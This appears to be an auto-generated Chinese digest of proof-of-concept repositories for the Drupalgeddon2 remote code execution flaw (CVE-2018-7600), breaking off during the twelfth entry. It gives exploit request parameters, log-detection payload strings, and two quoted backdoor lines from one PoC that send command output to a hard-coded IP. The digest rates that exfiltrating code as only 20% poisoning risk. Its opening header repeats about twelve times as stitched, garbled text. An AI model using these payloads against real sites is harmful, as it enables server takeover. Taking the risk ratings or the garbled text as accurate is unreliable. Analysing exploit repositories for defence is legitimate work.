# CVE-2018-7600

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-0xAJ2K_CVE-2018-7600.md](../2018/CVE-2018-7600-0xAJ2K_CVE-2018-7600.md)

# CVE-2018-7600

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-0xAJ2K_CVE-2018-7600.md](../2018/CVE-2018-7600-0xAJ2K_CVE-2018-7600.md)

# CVE-2018-7600

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-0xAJ2K_CVE-2018-7600.md](../2018/CVE-2018-7600-0xAJ2K_CVE-2018-7600.md)

# CVE-2018-7600

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-0xAJ2K_CVE-2018-7600.md](../2018/CVE-2018-7600-0xAJ2K_CVE-2018-7600.md)

# CVE-2018-7600

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-0xAJ2K_CVE-2018-7600.md](../2018/CVE-2018-7600-0xAJ2K_CVE-2018-7600.md)

# CVE-2018-7600

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-0xAJ2K_CVE-2018-7600.md](../2018/CVE-2018-7600-0xAJ2K_CVE-2018-7600.md)

# CVE-2018-7600

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-0xAJ2K_CVE-2018-7600.md](../2018/CVE-2018-7600-0xAJ2K_CVE-2018-7600.md)

# CVE-2018-7600

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-0xAJ2K_CVE-2018-7600.md](../2018/CVE-2018-7600-0xAJ2K_CVE-2018-7600.md)

# CVE-2018-7600

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-0xAJ2K_CVE-2018-7600.md](../2018/CVE-2018-7600-0xAJ2K_CVE-2018-7600.md)

# CVE-2018-7600

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-0xAJ2K_CVE-2018-7600.md](../2018/CVE-2018-7600-0xAJ2K_CVE-2018-7600.md)

# CVE-2018-7600

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-0xAJ2K_CVE-2018-7600.md](../2018/CVE-2018-7600-0xAJ2K_CVE-2018-7600.md)

# CVE-2018-7600

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-0xAJ2K_CVE-2018-7600.md](../2018/CVE-2018-7600-0xAJ2K_CVE-2018-7600.md)

# CVE-2018-7600

> 📦 该CVE有 **33** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #2

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
